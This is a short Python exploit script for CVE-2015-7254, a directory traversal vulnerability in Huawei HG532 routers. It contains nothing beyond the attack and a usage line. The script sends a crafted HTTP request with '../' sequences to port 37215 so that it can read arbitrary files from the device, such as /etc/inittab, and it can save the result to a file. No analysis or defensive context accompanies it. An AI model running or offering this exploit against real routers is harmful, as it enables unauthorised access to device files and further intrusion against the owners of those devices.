#!/usr/bin/python
#-*- coding: utf-8 -*-
# CVE-2015-7254
# Directory traversal vulnerability on Huawei HG532{e,n,s}
# Usage:
# $ ./CVE-2015-7254.py 192.168.11.10 /etc/inittab -o ./result.txt

import requests
import argparse


def exploit(ip, fname):
    url = 'http://' + str(ip) + ':37215/icon/../../../' + str(fname)

    try:
        response = requests.get(url)
    except Exception as e:
        print('[-] Error occurred.')
        # print(e)
    else:
        print(response.text)
        return response.text

    return ''

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    parser.add_argument('fname', default='/etc/inittab')
    parser.add_argument('-o','--out', dest='out')
    args = parser.parse_args()

    response = exploit(args.ip, args.fname)

    if args.out != None:
        open(args.out, 'wb').write(response)
